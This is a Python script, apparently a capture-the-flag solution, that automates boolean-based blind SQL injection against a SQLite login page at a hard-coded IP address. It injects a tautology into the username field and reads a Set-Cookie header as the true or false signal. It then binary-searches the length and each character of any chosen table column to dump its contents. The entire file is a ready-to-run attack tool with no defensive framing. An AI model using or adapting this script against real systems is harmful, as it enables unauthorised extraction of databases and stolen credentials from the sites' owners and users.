# -*- coding:utf-8 -*-

import requests
from argparse import ArgumentParser
url= 'http://111.198.29.45:32197/login.php'
ss = requests.session()

raw_payload="usr=hi' or (({sql}){condition} and 1) --&pw=1"
length_sql = "select length(group_concat({field})) from {table} where {where}"
#sqlite中没有ord,只有unicode
field__sql = "select unicode(substr(group_concat({field}),{index},1))) from {table} where {where}"
def post(sql,condition,isPrint=True):
    headers={"Content-Type":"application/x-www-form-urlencoded"}
    payload = raw_payload.format(sql=sql,condition=condition)
    res = ss.post(url,data=payload,headers=headers)
    if isPrint:
        print("payload:%s"%payload)
        #print(res.headers)
    if 'Set-Cookie' in res.headers.keys():
        return True
    else:
        return False

def binary_search_length(field, table, where):
    print('查询表: %s 中字段: %s 值的总长度' % (table, field))
    sql = length_sql.format(field=field,table=table,where=where if where else '1')
    len = binary_search(sql, 0, 200)
    print('表: %s 中字段: %s 值总长度为: %d' % (table, field, len))
    return len

def binary_search_value(field, table, where, total_length):
    result = ''
    for i in range(1, total_length+1):
        sql = field__sql.format(field=field, table=table, index=i, where=where if where else '1')
        value = chr(binary_search(sql,0,128))
        result += value
    print('查询结束，表: %s 中字段: %s 的内容为: %s' % (table, field, result))
    return result

def binary_search(sql, minV, maxV):
    median = (minV+maxV)//2
    if median == minV:
        return minV if post(sql, '='+str(minV)) else maxV
    if post(sql, '>='+str(median)):
        return binary_search(sql, median, maxV)
    else:
        return binary_search(sql, minV, median)	

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('-t', '--table', help='要查询的表名', required=True)
    parser.add_argument('-f', '--field', help='要查询的字段名', required=True)
    parser.add_argument('-w', '--where', help='查询条件')
    args = parser.parse_args()
    length = binary_search_length(args.field, args.table, args.where)
    binary_search_value(args.field, args.table, args.where, length)


